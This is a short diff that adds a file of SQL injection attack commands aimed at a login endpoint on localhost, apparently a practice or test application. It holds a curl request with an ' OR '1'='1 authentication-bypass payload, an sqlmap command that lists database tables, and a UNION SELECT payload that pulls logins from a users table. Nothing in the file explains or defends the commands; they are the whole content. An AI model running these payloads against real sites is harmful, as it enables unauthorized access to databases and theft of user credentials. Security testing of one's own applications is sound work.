@@ -1,0 +1,7 @@
+curl -X POST http://127.0.0.1:5000/login \
+-H "Content-Type: application/x-www-form-urlencoded" \
+--data "email=test@example.com' OR '1'='1&password=test"
+
+sqlmap -u "http://127.0.0.1:5000/login" --data="email=test@example.com&password=test" --tables
+
+test@example.com' UNION SELECT NULL, login, NULL, NULL FROM users LIMIT 2 OFFSET 2--
